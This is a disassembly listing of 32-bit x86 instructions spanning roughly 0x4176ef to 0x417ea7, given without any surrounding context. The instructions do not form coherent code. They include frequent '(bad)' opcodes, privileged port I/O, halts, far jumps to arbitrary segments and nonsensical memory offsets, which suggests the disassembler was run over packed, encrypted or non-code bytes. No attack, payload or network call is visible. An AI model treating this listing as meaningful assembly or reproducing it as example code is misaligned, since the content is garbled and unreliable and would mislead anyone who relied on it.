  4176ef:	sub    edi,DWORD PTR [ebx+0x70227167]
  4176f5:	adc    eax,0xa56437fb
  4176fa:	loope  0x41768a
  4176fc:	mov    WORD PTR [edi+0x61],?
  4176ff:	iret   
  417700:	add    BYTE PTR [edi-0x78c0e2eb],0xa5
  417707:	cmp    BYTE PTR [eax-0x29f0e52f],bh
  41770d:	mov    cl,0x78
  41770f:	or     edi,DWORD PTR [edi+eax*1-0x7da75293]
  417716:	inc    ebx
  417717:	repz sub ch,BYTE PTR [esi+0x20e1ce8c]
  41771e:	xchg   ebx,eax
  41771f:	fstp   TBYTE PTR [ecx+0x67]
  417722:	adc    eax,DWORD PTR [eax+0x1]
  417725:	jg     0x41775f
  417727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417728:	ds push ds
  41772a:	jp     0x41777c
  41772c:	or     bh,ch
  41772e:	push   esp
  41772f:	jp     0x417758
  417731:	popa   
  417732:	mov    al,0x4d
  417734:	(bad)  [ebp-0x15fff3e8]
  41773a:	addr16 out 0x83,eax
  41773d:	retf   
  41773e:	sbb    DWORD PTR [edi-0x68],0x4e
  417742:	loopne 0x4176e3
  417744:	hlt    
  417745:	adc    bl,al
  417747:	fwait
  417748:	hlt    
  417749:	sti    
  41774a:	adc    DWORD PTR [edx+0x65],esi
  41774d:	test   DWORD PTR [ecx-0x3397ca4a],ecx
  417753:	jmp    0x417732
  417755:	mov    ch,0x2d
  417757:	xor    bh,BYTE PTR [ecx+edx*2-0x79]
  41775b:	inc    edx
  41775c:	dec    esi
  41775d:	push   edi
  41775e:	sbb    BYTE PTR [edi+edi*8],dh
  417761:	dec    edi
  417762:	pop    ecx
  417763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417764:	int3   
  417765:	aaa    
  417766:	mov    edx,0xda4e7447
  41776b:	fst    DWORD PTR [esi+edx*8+0x69461695]
  417772:	add    eax,0xf0f0b1dc
  417777:	xchg   ebp,eax
  417778:	lock mov ecx,0x2ecf2c7d
  41777e:	inc    ebx
  41777f:	pop    ss
  417780:	mov    al,ds:0xe32cc3da
  417785:	bound  ecx,QWORD PTR [edx+ebx*8+0x7860355e]
  41778c:	hlt    
  41778d:	cwde   
  41778e:	ret    
  41778f:	inc    esp
  417790:	aas    
  417791:	sub    ah,bl
  417793:	jns    0x417751
  417795:	cmp    eax,DWORD PTR [ebx+ebp*1-0xc]
  417799:	inc    ecx
  41779a:	mov    ebx,0xd57b6d7c
  41779f:	jne    0x4177e6
  4177a1:	jmp    0x3d1f:0xec2e77aa
  4177a8:	pop    esp
  4177a9:	dec    edx
  4177aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ab:	pop    ebx
  4177ac:	cs push ebp
  4177ae:	or     DWORD PTR [ecx+0x27fa549a],eax
  4177b4:	je     0x4177ed
  4177b6:	jl     0x4177dc
  4177b8:	push   ecx
  4177b9:	div    ebp
  4177bb:	enter  0xd5f9,0x32
  4177bf:	pop    esi
  4177c0:	cmp    esi,DWORD PTR [edi+0x3c6bd7ad]
  4177c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177c7:	adc    cl,al
  4177c9:	test   eax,0x3d8f9b4a
  4177ce:	adc    al,0xc2
  4177d0:	fsub   DWORD PTR [edi+ecx*8-0x4f]
  4177d4:	movhlps xmm0,xmm3
  4177d7:	push   ecx
  4177d8:	xor    ecx,eax
  4177da:	jne    0x417856
  4177dc:	xchg   edx,eax
  4177dd:	(bad)  
  4177de:	jmp    0x417824
  4177e0:	stc    
  4177e1:	pop    esi
  4177e2:	aam    0x1d
  4177e4:	aaa    
  4177e5:	inc    edi
  4177e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177e7:	test   eax,0x1f296605
  4177ec:	in     eax,dx
  4177ed:	in     al,0x65
  4177ef:	and    BYTE PTR [ebx-0xa],0x69
  4177f3:	cli    
  4177f4:	ret    
  4177f5:	pop    eax
  4177f6:	push   esp
  4177f7:	jecxz  0x41783e
  4177f9:	pop    esi
  4177fa:	or     DWORD PTR [ebp-0x3d],esi
  4177fd:	mov    al,0x21
  4177ff:	xchg   esi,eax
  417800:	outs   dx,DWORD PTR ds:[esi]
  417801:	mov    al,0x89
  417803:	call   0x3ea8:0x79682078
  41780a:	mov    ecx,0xcd376396
  41780f:	out    dx,eax
  417810:	bound  eax,QWORD PTR [eax]
  417812:	mov    cl,0x49
  417814:	and    al,0x13
  417816:	fld    TBYTE PTR [esi]
  417818:	pop    ebx
  417819:	aas    
  41781a:	in     eax,0x6a
  41781c:	sahf   
  41781d:	out    0xe4,eax
  41781f:	pushf  
  417820:	cwde   
  417821:	mov    al,ds:0xb62fe180
  417826:	nop
  417827:	stos   BYTE PTR es:[edi],al
  417828:	inc    eax
  417829:	mul    BYTE PTR [ebx-0x5e35c736]
  41782f:	push   ss
  417830:	(bad)  
  417831:	shr    DWORD PTR ds:0x395d328c,cl
  417837:	inc    edx
  417838:	pop    ss
  417839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783a:	sub    al,0x82
  41783c:	xor    eax,DWORD PTR [ebx]
  41783e:	jbe    0x4178be
  417840:	xchg   ebx,eax
  417841:	jl     0x41788f
  417843:	test   cl,dl
  417845:	fdiv   QWORD PTR [ebp-0x73d1b41b]
  41784b:	inc    ebx
  41784c:	pop    edi
  41784d:	test   eax,0x1609f65
  417852:	sub    bh,BYTE PTR [ebx-0x51]
  417855:	push   ss
  417856:	jno    0x417812
  417858:	ror    esi,0x7b
  41785b:	jmp    0x417846
  41785d:	nop
  41785e:	mov    cl,0x2d
  417860:	les    esi,FWORD PTR [eax+ebp*1]
  417863:	push   eax
  417864:	ror    DWORD PTR [eax-0x303629ad],0x14
  41786b:	dec    esi
  41786c:	jae    0x417806
  41786e:	or     dl,bh
  417870:	stos   DWORD PTR es:[edi],eax
  417871:	adc    BYTE PTR [eax+0x178f425b],bl
  417877:	je     0x4178d9
  417879:	xchg   esp,eax
  41787a:	mov    ds:0x7a6b0e1e,eax
  41787f:	xor    ah,BYTE PTR [ecx+0x782c2cae]
  417885:	xor    bh,bl
  417887:	scas   al,BYTE PTR es:[edi]
  417888:	stc    
  417889:	jp     0x4178fe
  41788b:	cs cmc 
  41788d:	xor    eax,0xd5e9db78
  417892:	stc    
  417893:	or     ecx,esi
  417895:	mov    al,ds:0x417ac64c
  41789a:	mov    ds:0xc1eed63,al
  41789f:	push   0x3a
  4178a1:	cmp    eax,0xf539bde1
  4178a6:	int3   
  4178a7:	(bad)  
  4178a8:	xchg   edi,eax
  4178a9:	popa   
  4178aa:	jg     0x4178ab
  4178ac:	fs ins BYTE PTR es:[edi],dx
  4178ae:	xor    al,0xb6
  4178b0:	add    BYTE PTR [ebx-0x4b07650f],ch
  4178b6:	out    0x71,eax
  4178b8:	jecxz  0x417917
  4178ba:	outs   dx,BYTE PTR ds:[esi]
  4178bb:	xchg   edx,eax
  4178bc:	jns    0x417883
  4178be:	push   ebp
  4178bf:	not    ecx
  4178c1:	test   eax,edx
  4178c3:	jne    0x417926
  4178c5:	cmp    eax,0x85c40998
  4178ca:	das    
  4178cb:	cmp    ch,BYTE PTR [esi]
  4178cd:	xchg   DWORD PTR [ecx+0x4ba0a3bc],esp
  4178d3:	mov    edi,0xc2ff766f
  4178d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178d9:	xchg   esp,eax
  4178da:	jmp    0x2384:0xfe564746
  4178e1:	push   edi
  4178e2:	ja     0x41787b
  4178e4:	fs cmc 
  4178e6:	cdq    
  4178e7:	loope  0x4178ea
  4178e9:	jno    0x4178a9
  4178eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ec:	pop    ds
  4178ed:	es mov cl,0xc6
  4178f0:	dec    esp
  4178f1:	sbb    ah,bh
  4178f3:	(bad)  
  4178f4:	in     al,dx
  4178f5:	nop
  4178f6:	push   esp
  4178f7:	in     eax,0x3b
  4178f9:	push   ebx
  4178fa:	ja     0x41792a
  4178fc:	fldz   
  4178fe:	or     esp,DWORD PTR [edx]
  417900:	jp     0x417961
  417902:	(bad)  
  417903:	mov    esi,0x56746488
  417908:	cmp    ebp,DWORD PTR [ecx]
  41790a:	loopne 0x417948
  41790c:	dec    edi
  41790d:	push   es
  41790e:	mov    ds:0x4366e649,al
  417913:	pop    esp
  417914:	adc    al,0x44
  417916:	dec    ebx
  417917:	popf   
  417918:	jnp    0x41794d
  41791a:	(bad)  
  41791c:	out    0xc4,al
  41791e:	xchg   BYTE PTR [edx-0x110fa8f1],ch
  417924:	mov    WORD PTR [esi-0x45],ds
  417927:	(bad)  
  417928:	jae    0x417944
  41792a:	cmp    al,0xa
  41792c:	push   edi
  41792d:	loopne 0x4178cc
  41792f:	aaa    
  417930:	stc    
  417931:	add    DWORD PTR [edx+0x7fce76d3],0x6c
  417938:	fstp   QWORD PTR [esi]
  41793a:	lfs    edi,FWORD PTR [ebp-0x36]
  41793e:	(bad)  
  41793f:	fdiv   QWORD PTR ds:0x3d48f31e
  417945:	sbb    DWORD PTR [esi+0x3d],edi
  417948:	pop    ss
  417949:	sub    cl,BYTE PTR [ecx+0x6e]
  41794c:	sub    al,BYTE PTR [edx+0x53]
  41794f:	push   esp
  417950:	jmp    0x41795d
  417952:	push   ecx
  417953:	arpl   dx,dx
  417955:	outs   dx,DWORD PTR ds:[esi]
  417956:	pop    ecx
  417957:	mov    ebp,0x52b9d075
  41795c:	pop    es
  41795d:	and    al,0x81
  41795f:	inc    esp
  417960:	outs   dx,BYTE PTR ds:[esi]
  417961:	outs   dx,DWORD PTR ds:[esi]
  417962:	xor    edx,ebx
  417964:	adc    DWORD PTR [ebp+0x3c],ecx
  417967:	mov    esi,0xdcdeebcf
  41796c:	push   ebx
  41796d:	pop    esp
  41796e:	pop    esp
  41796f:	imul   ecx,ecx,0x2db9d2e4
  417975:	xor    eax,0x5dc6e14
  41797a:	lods   eax,DWORD PTR ds:[esi]
  41797b:	sbb    DWORD PTR [eiz*1+0x4b1d6991],ebx
  417982:	dec    esp
  417983:	xchg   edx,eax
  417984:	or     BYTE PTR [eax-0x19],0xd1
  417988:	inc    edx
  417989:	in     al,0x7d
  41798b:	iret   
  41798c:	js     0x4179bb
  41798e:	in     al,0x42
  417990:	retf   
  417991:	xor    BYTE PTR [eax+0x360f0985],cl
  417997:	pop    edx
  417998:	hlt    
  417999:	xchg   ebp,eax
  41799a:	ret    0x23bb
  41799d:	and    eax,0xca40c92c
  4179a2:	sar    BYTE PTR [eax],0x5a
  4179a5:	lea    esi,[eax+0x61]
  4179a8:	aad    0xe7
  4179aa:	sub    DWORD PTR [esi],0xd10782ed
  4179b0:	mov    cl,0xd3
  4179b2:	lds    ebp,FWORD PTR [eax]
  4179b4:	inc    edx
  4179b5:	popf   
  4179b6:	ret    
  4179b7:	fwait
  4179b8:	je     0x417a21
  4179ba:	xchg   ebx,eax
  4179bb:	mov    bh,0xe3
  4179bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179be:	add    al,0xdc
  4179c0:	clc    
  4179c1:	xchg   ebp,eax
  4179c2:	inc    ebp
  4179c3:	sbb    BYTE PTR [edx+0x5302374a],bl
  4179c9:	jno    0x417a38
  4179cb:	mov    cl,0xbd
  4179cd:	call   0x2bd5:0xb8045100
  4179d4:	mov    al,0x98
  4179d6:	xor    edi,DWORD PTR [ecx+0x2bcbc894]
  4179dc:	mov    ch,BYTE PTR [edi-0x1700991a]
  4179e2:	xor    bh,BYTE PTR [ecx+0x7b0c8b49]
  4179e8:	dec    ecx
  4179e9:	mov    cl,0x33
  4179eb:	aam    0x66
  4179ed:	outs   dx,BYTE PTR ds:[esi]
  4179ee:	shl    BYTE PTR [ebp-0x57],cl
  4179f1:	mov    dh,0x23
  4179f3:	test   DWORD PTR [edi+eiz*1+0x65],ebp
  4179f7:	imul   eax,ebx,0x68
  4179fa:	push   cs
  4179fb:	cmp    DWORD PTR [ecx+edi*8-0x1c],eax
  4179ff:	mov    ebp,0x49fa7903
  417a04:	div    al
  417a06:	mov    ebx,0x23d256dc
  417a0b:	mov    bh,0x2e
  417a0d:	mov    ch,0x8e
  417a0f:	cwde   
  417a10:	sbb    al,0x47
  417a12:	std    
  417a13:	xchg   ebp,eax
  417a14:	inc    eax
  417a15:	xor    dh,BYTE PTR [edx+0x6b9f359e]
  417a1b:	in     al,0x87
  417a1d:	data16 cld 
  417a1f:	inc    ebp
  417a20:	shl    DWORD PTR [edi],1
  417a22:	arpl   WORD PTR [edi],bp
  417a24:	out    0x38,eax
  417a26:	fadd   DWORD PTR [edx]
  417a28:	fstp   DWORD PTR [eax+0x11]
  417a2b:	es jae 0x4179fe
  417a2e:	fidivr DWORD PTR [ebp*2+0x1f9dd4c9]
  417a35:	fwait
  417a36:	mov    dh,0x51
  417a38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a39:	xor    ch,BYTE PTR [ecx+0x47886f3d]
  417a3f:	enter  0x5b38,0x88
  417a43:	dec    ecx
  417a44:	dec    edi
  417a45:	pushf  
  417a46:	push   ebp
  417a47:	mov    ds:0xf4cbb056,eax
  417a4c:	and    al,0x98
  417a4e:	jnp    0x417ac6
  417a50:	pop    edi
  417a51:	repnz push ebp
  417a53:	dec    ebp
  417a54:	mov    al,ds:0x6853527d
  417a59:	pop    eax
  417a5a:	mov    BYTE PTR ds:0xe7d81bb5,0x26
  417a61:	add    esp,esp
  417a63:	sub    al,0x1d
  417a65:	add    edi,ebp
  417a67:	sbb    al,0x4
  417a69:	sbb    esi,DWORD PTR [ebp+0x289a266b]
  417a6f:	push   esi
  417a70:	shl    BYTE PTR [edx+eiz*8-0x40],cl
  417a74:	ret    
  417a75:	mov    ds:0xddf199d1,eax
  417a7a:	xor    dl,ah
  417a7c:	pop    ds
  417a7d:	lahf   
  417a7e:	lds    edi,FWORD PTR [ecx+0x79eeb9fa]
  417a84:	push   es
  417a85:	mov    al,ds:0xdb2dd7c1
  417a8a:	mov    dh,0x3d
  417a8c:	pop    edx
  417a8d:	(bad)  
  417a8e:	mov    bh,0xa0
  417a90:	call   0x1157:0x9afc9bed
  417a97:	int    0xbc
  417a99:	push   es
  417a9a:	jno    0x417a5e
  417a9c:	aas    
  417a9d:	push   eax
  417a9e:	lock inc edx
  417aa0:	cld    
  417aa1:	inc    eax
  417aa2:	mov    ebx,0x4cf56439
  417aa7:	les    edi,FWORD PTR [edx+0x61]
  417aaa:	adc    al,0xa9
  417aac:	lock adc BYTE PTR [edx-0x15],bh
  417ab0:	jecxz  0x417a78
  417ab2:	lods   al,BYTE PTR ds:[esi]
  417ab3:	sbb    esp,ebx
  417ab5:	push   0xc3facb2a
  417aba:	lds    esp,FWORD PTR [ecx+edi*1]
  417abd:	(bad)  
  417abe:	pop    ss
  417abf:	mov    al,ds:0xd8e9e40e
  417ac4:	retf   0x3320
  417ac7:	(bad)  
  417ac8:	push   ecx
  417ac9:	test   BYTE PTR [esi-0x7949bf80],ch
  417acf:	fbstp  TBYTE PTR [edi-0x1c]
  417ad2:	(bad)  
  417ad3:	jp     0x417a5a
  417ad5:	lahf   
  417ad6:	sbb    al,0x71
  417ad8:	ds jle 0x417aca
  417adb:	cmp    eax,0x68f76bac
  417ae0:	add    eax,0x942b926b
  417ae5:	sub    al,0xe1
  417ae7:	xchg   edi,eax
  417ae8:	jmp    0xf38c913b
  417aed:	mov    edx,0x25c10944
  417af2:	dec    edi
  417af3:	mov    al,ds:0x31e526e8
  417af8:	mov    DWORD PTR [eax],ebp
  417afa:	fmul   QWORD PTR [esp+ecx*4-0x32]
  417afe:	mov    al,dl
  417b00:	imul   DWORD PTR [ecx]
  417b02:	int3   
  417b03:	ss cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  417b06:	stc    
  417b07:	cmp    edx,DWORD PTR [eax-0x8]
  417b0a:	inc    esp
  417b0b:	sbb    ebx,DWORD PTR [esi-0x3a8fb42]
  417b11:	out    0x2c,al
  417b13:	into   
  417b14:	div    ecx
  417b16:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b18:	fadd   st(2),st
  417b1a:	sar    edx,1
  417b1c:	dec    esp
  417b1d:	or     ecx,esi
  417b1f:	cmc    
  417b20:	mov    al,ds:0x1a1cdb54
  417b25:	xchg   edi,eax
  417b26:	test   BYTE PTR [ecx+0x2eddfb33],dh
  417b2c:	or     BYTE PTR [eax+0x6ab2bca],dl
  417b32:	add    dh,BYTE PTR [esi]
  417b34:	mov    WORD PTR [eax],?
  417b36:	push   es
  417b37:	sbb    BYTE PTR ds:0x95a99235,ah
  417b3d:	xor    ebx,DWORD PTR [edx+0x7]
  417b40:	pop    ecx
  417b41:	inc    ebp
  417b42:	cmp    BYTE PTR [eax-0x21ff2616],al
  417b48:	xchg   ecx,eax
  417b49:	sbb    bh,bh
  417b4b:	push   ecx
  417b4c:	mov    ds:0x4b85b291,eax
  417b51:	out    0x28,al
  417b53:	inc    eax
  417b54:	xor    eax,0x38705a70
  417b59:	push   es
  417b5a:	jne    0x417b6c
  417b5c:	and    BYTE PTR [edi-0x27],al
  417b5f:	hlt    
  417b60:	push   0x6204a144
  417b65:	mov    ds:0xfe313004,eax
  417b6a:	jb     0x417b9b
  417b6c:	mov    al,0xe3
  417b6e:	sahf   
  417b6f:	lds    edi,FWORD PTR [ebp-0x4d]
  417b72:	retf   
  417b73:	cwde   
  417b74:	pop    eax
  417b75:	xchg   ecx,eax
  417b76:	rol    BYTE PTR [edx-0x40],0xc
  417b7a:	sar    DWORD PTR [esi],0x89
  417b7d:	cld    
  417b7e:	scas   al,BYTE PTR es:[edi]
  417b7f:	sbb    DWORD PTR [esi-0x2d22a028],esp
  417b85:	ins    BYTE PTR es:[edi],dx
  417b86:	adc    dh,dl
  417b88:	mov    esi,0xe6445aff
  417b8d:	cmp    DWORD PTR [esi+0x67],0xf5337c69
  417b94:	arpl   WORD PTR [edx],ax
  417b96:	jne    0x417bea
  417b98:	mov    ds:0x76d4ab66,al
  417b9d:	mov    BYTE PTR [edi-0x34],dh
  417ba0:	push   0xae62f36
  417ba5:	jb     0x417b37
  417ba7:	push   ebp
  417ba8:	retf   
  417ba9:	push   es
  417baa:	mov    edi,0xcf3ea3d5
  417baf:	enter  0x4058,0x13
  417bb3:	fild   QWORD PTR [esi+0x3b]
  417bb6:	retf   0x110d
  417bb9:	mov    esi,0x491805cd
  417bbe:	cmp    DWORD PTR ds:0x35e64976,esi
  417bc4:	imul   ecx,DWORD PTR [eax+0x74bae4f8],0xffa73c85
  417bce:	mov    eax,0x8003f290
  417bd3:	das    
  417bd4:	push   edi
  417bd5:	cmp    eax,0x1c72289c
  417bda:	aas    
  417bdb:	push   edi
  417bdc:	or     ebp,DWORD PTR [edi+0x20]
  417bdf:	js     0x417c33
  417be1:	in     al,dx
  417be2:	dec    ebp
  417be3:	xchg   ebp,eax
  417be4:	out    dx,eax
  417be5:	mov    edx,0xa08eb019
  417bea:	sbb    al,0x8
  417bec:	add    cl,dh
  417bee:	sbb    eax,0x25c1a44c
  417bf3:	retf   0x5cc8
  417bf6:	not    BYTE PTR [ebp+0x51396574]
  417bfc:	adc    bl,BYTE PTR [edi+0x230532b3]
  417c02:	adc    ah,dh
  417c04:	shr    ebp,cl
  417c06:	leave  
  417c07:	push   edi
  417c08:	pop    ebx
  417c09:	les    ebp,FWORD PTR [edx-0xd7c2c25]
  417c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c10:	shl    DWORD PTR [ebx],cl
  417c12:	push   edi
  417c13:	ds mov bl,0xa
  417c16:	xchg   BYTE PTR [ebp-0x6],al
  417c19:	pushf  
  417c1a:	aaa    
  417c1b:	dec    esp
  417c1c:	in     eax,0xfd
  417c1e:	mov    bh,0xe8
  417c20:	loope  0x417ba6
  417c22:	xchg   esp,eax
  417c23:	in     al,0xe5
  417c25:	dec    edx
  417c26:	cmp    DWORD PTR [eax],esi
  417c28:	sub    al,0x97
  417c2a:	lods   eax,DWORD PTR ds:[esi]
  417c2b:	retf   0x2cfa
  417c2e:	stc    
  417c2f:	pushf  
  417c30:	adc    BYTE PTR [eax+0x268f2474],ah
  417c36:	jno    0x417bfa
  417c38:	inc    ecx
  417c39:	adc    ah,BYTE PTR [ebp+0x77]
  417c3c:	mov    fs,WORD PTR [ebx-0x6713360d]
  417c42:	sar    BYTE PTR [edi+0x5d],cl
  417c45:	inc    edx
  417c46:	jae    0x417c31
  417c48:	dec    edi
  417c49:	div    BYTE PTR [eax+eax*1]
  417c4c:	cmc    
  417c4d:	dec    BYTE PTR [edi+0x5e]
  417c50:	(bad)  
  417c52:	push   es
  417c53:	push   es
  417c54:	xor    al,0x8b
  417c56:	lods   al,BYTE PTR ds:[esi]
  417c57:	aas    
  417c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c59:	xor    al,0x80
  417c5b:	pop    ss
  417c5c:	fisttp WORD PTR ds:0xdba61e6a
  417c62:	mov    bh,0xd6
  417c64:	dec    ecx
  417c65:	xor    eax,0x397d8b59
  417c6a:	loop   0x417c03
  417c6c:	iret   
  417c6d:	cwde   
  417c6e:	js     0x417c70
  417c70:	out    dx,eax
  417c71:	je     0x417c3b
  417c73:	mov    ds:0xbfd41433,eax
  417c78:	inc    ebp
  417c79:	fs jl  0x417cb6
  417c7c:	push   esi
  417c7d:	fild   DWORD PTR [ebp-0x6bec6ba3]
  417c83:	js     0x417c37
  417c85:	mov    esp,0xd4cda141
  417c8a:	pmulhuw mm1,QWORD PTR [edi-0x66]
  417c8e:	push   es
  417c8f:	(bad)  [edi]
  417c91:	inc    eax
  417c92:	in     al,dx
  417c93:	mov    ah,0x65
  417c95:	cmp    DWORD PTR [ebx+0x14],edx
  417c98:	xor    al,0xa4
  417c9a:	sub    DWORD PTR [esi-0x4b],ebp
  417c9d:	shr    BYTE PTR [esi+ecx*1+0x1f42bc53],cl
  417ca4:	mov    al,ds:0xd976888e
  417ca9:	hlt    
  417caa:	(bad)  
  417cab:	fst    DWORD PTR [edi]
  417cad:	(bad)  
  417caf:	popf   
  417cb0:	xor    BYTE PTR [ecx-0x5],0x18
  417cb4:	shl    DWORD PTR cs:[ebx-0x15],0x86
  417cb9:	mov    ds:0xa9fcffbb,al
  417cbe:	xor    dl,BYTE PTR [edi-0x51]
  417cc1:	and    eax,0xb8363560
  417cc6:	sahf   
  417cc7:	cld    
  417cc8:	inc    ebx
  417cc9:	pop    eax
  417cca:	pop    es
  417ccb:	aad    0x8d
  417ccd:	inc    esi
  417cce:	in     al,dx
  417ccf:	stos   DWORD PTR es:[edi],eax
  417cd0:	cmp    al,0x46
  417cd2:	(bad)  
  417cd3:	mov    al,0x7b
  417cd5:	sbb    DWORD PTR [ebx],ebp
  417cd7:	sbb    eax,0x9d82baab
  417cdc:	imul   ecx,DWORD PTR [ecx+0x32],0xe85c7a98
  417ce3:	inc    esi
  417ce4:	xchg   edx,eax
  417ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce6:	iret   
  417ce7:	mov    DWORD PTR ds:0x5ec6d0ee,ebx
  417ced:	icebp  
  417cee:	or     DWORD PTR [ecx],ebx
  417cf0:	xor    BYTE PTR [ebp+ebp*4-0x64],cl
  417cf4:	shl    DWORD PTR [edx-0x19],1
  417cf7:	fld    DWORD PTR [edx+0x1f56c66f]
  417cfd:	jo     0x417d60
  417cff:	push   ss
  417d00:	dec    edx
  417d01:	sbb    al,0x72
  417d03:	ret    
  417d04:	or     eax,0xcbefbc3a
  417d09:	push   ecx
  417d0a:	xor    DWORD PTR [ecx],ebx
  417d0c:	ja     0x417ca3
  417d0e:	pop    es
  417d0f:	arpl   WORD PTR [edx],ax
  417d11:	cmp    eax,0xd0ec6270
  417d16:	not    edi
  417d18:	sub    eax,0x3e4eedb6
  417d1d:	js     0x417d03
  417d1f:	push   0xffffff86
  417d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d22:	fst    DWORD PTR [eax-0x7c]
  417d25:	outs   dx,BYTE PTR ds:[esi]
  417d26:	in     al,dx
  417d27:	jae    0x417cdc
  417d29:	mov    eax,ds:0x11f601d7
  417d2e:	inc    edx
  417d2f:	sub    BYTE PTR [esi+0x48fe8989],ch
  417d35:	mov    eax,ds:0x45609899
  417d3a:	rcr    BYTE PTR [eax],cl
  417d3c:	mov    al,0x9d
  417d3e:	jno    0x417d7c
  417d40:	cmp    BYTE PTR [edx+0x63],bl
  417d43:	in     eax,dx
  417d44:	push   ss
  417d45:	add    al,BYTE PTR ds:[edx-0x1b]
  417d49:	dec    eax
  417d4a:	call   0xcdff:0x26be8f7d
  417d51:	in     al,dx
  417d52:	cmp    eax,0x4ba2b321
  417d57:	pop    eax
  417d58:	adc    ecx,DWORD PTR [eax+0x6e]
  417d5b:	push   ss
  417d5c:	xchg   ecx,eax
  417d5d:	mov    eax,0x374a19c1
  417d62:	cmp    eax,0x575a29d0
  417d67:	test   BYTE PTR [edi],ch
  417d69:	mov    dh,0x74
  417d6b:	or     dh,bl
  417d6d:	cmc    
  417d6e:	loop   0x417d53
  417d70:	je     0x417dd3
  417d72:	dec    ebx
  417d73:	js     0x417d86
  417d75:	cmp    eax,0xfb121261
  417d7a:	jno    0x417d24
  417d7c:	loop   0x417df8
  417d7e:	sbb    al,0xd9
  417d80:	jns    0x417dba
  417d82:	xor    al,0x37
  417d84:	push   ds
  417d85:	jg     0x417d34
  417d87:	jns    0x417d52
  417d89:	xchg   ebp,eax
  417d8a:	adc    DWORD PTR [esi-0x33],ebx
  417d8d:	repnz pop ecx
  417d8f:	nop
  417d90:	push   esi
  417d91:	daa    
  417d92:	mov    ds:0x3988c58d,eax
  417d97:	xchg   edx,eax
  417d98:	xchg   ebp,eax
  417d99:	js     0x417df3
  417d9b:	dec    edx
  417d9c:	fs or  al,0x20
  417d9f:	ficom  WORD PTR [eax-0x21a6ce4d]
  417da5:	cmp    bh,al
  417da7:	xlat   BYTE PTR ds:[ebx]
  417da8:	jmp    0xa47d6b82
  417dad:	xchg   ebp,eax
  417dae:	add    DWORD PTR [ebx],esp
  417db0:	adc    BYTE PTR ds:0x5d474002,0x9d
  417db7:	lds    ebx,FWORD PTR [ebx+0x700e63c9]
  417dbd:	dec    ecx
  417dbe:	mov    ds:0x3c6987e7,eax
  417dc3:	xchg   esp,eax
  417dc4:	iret   
  417dc5:	shl    DWORD PTR [edx+esi*2],0x9
  417dc9:	cmp    DWORD PTR [edx],esi
  417dcb:	retf   0xd209
  417dce:	cld    
  417dcf:	out    dx,al
  417dd0:	push   esi
  417dd1:	sbb    eax,0xd53c1d6a
  417dd6:	ss out 0x9f,al
  417dd9:	dec    edx
  417dda:	jmp    0xaee5:0x261a6478
  417de1:	prefetch (bad)
  417de2:	or     eax,0x946f84ed
  417de7:	cdq    
  417de8:	sbb    DWORD PTR [ecx],ebx
  417dea:	in     al,dx
  417deb:	mov    ds:0xcd715da,eax
  417df0:	ja     0x417db9
  417df2:	test   eax,0xfa0c8bd6
  417df7:	imul   ebp,esi,0xffffffd0
  417dfa:	arpl   WORD PTR [edx+ecx*8-0x7a],si
  417dfe:	pop    edx
  417dff:	(bad)  
  417e00:	add    eax,0x603ff1ea
  417e05:	sbb    ebp,DWORD PTR [eax-0x32]
  417e08:	adc    al,0xa5
  417e0a:	test   eax,0xf6a8c33c
  417e0f:	mov    dl,dl
  417e11:	lods   eax,DWORD PTR ds:[esi]
  417e12:	pop    es
  417e13:	fild   WORD PTR ds:0x33cce331
  417e19:	test   eax,0xb014541b
  417e1e:	in     eax,dx
  417e1f:	jp     0x417e26
  417e21:	mov    edi,0x6fc54b08
  417e26:	adc    BYTE PTR [eax-0x334e6d08],cl
  417e2c:	pop    edx
  417e2d:	mov    al,0x85
  417e2f:	xchg   esi,eax
  417e30:	jno    0x417dec
  417e32:	pop    ds
  417e33:	lds    edx,FWORD PTR [esi-0x79537bca]
  417e39:	pop    edi
  417e3a:	pusha  
  417e3b:	push   ebx
  417e3c:	popf   
  417e3d:	push   0xca76a5a9
  417e42:	pop    edi
  417e43:	mov    esp,0xde588456
  417e48:	mov    DWORD PTR [ebx+edi*8+0x7f],esi
  417e4c:	add    eax,0xf5221433
  417e51:	xor    al,0x3a
  417e53:	mov    WORD PTR [ebp-0x8],ds
  417e56:	fidivr DWORD PTR [ebp+0x4f5c2d3f]
  417e5c:	in     eax,dx
  417e5d:	cwde   
  417e5e:	repz inc edi
  417e60:	(bad)  [edi]
  417e62:	lds    ecx,FWORD PTR [eax+0xea09493]
  417e68:	lods   eax,DWORD PTR ss:[esi]
  417e6a:	sbb    edx,DWORD PTR [ebp-0x6b8361e0]
  417e70:	mov    dh,0x2e
  417e72:	push   ebp
  417e73:	(bad)  
  417e74:	rol    bl,cl
  417e76:	dec    esi
  417e77:	outs   dx,BYTE PTR ds:[esi]
  417e78:	out    dx,eax
  417e79:	pop    edx
  417e7a:	in     eax,0x86
  417e7c:	lock and DWORD PTR [edx+0x71],ebp
  417e80:	mov    esp,0xffbc1f6
  417e85:	sar    BYTE PTR [eax+eax*4],0x3e
  417e89:	lods   al,BYTE PTR ds:[esi]
  417e8a:	adc    al,0xcb
  417e8c:	xor    BYTE PTR [esi],ch
  417e8e:	pop    esp
  417e8f:	dec    esi
  417e90:	mov    edi,0xf2ba2978
  417e95:	leave  
  417e96:	jne    0x417e36
  417e98:	mov    esp,0x8ae9761a
  417e9d:	pop    ecx
  417e9e:	stos   BYTE PTR es:[edi],al
  417e9f:	fisub  WORD PTR [ecx]
  417ea1:	adc    eax,0x61cbf062
  417ea6:	pop    ss
  417ea7:	add    BYTE PTR [edx+eiz*1+0x344b52a2],0xf5
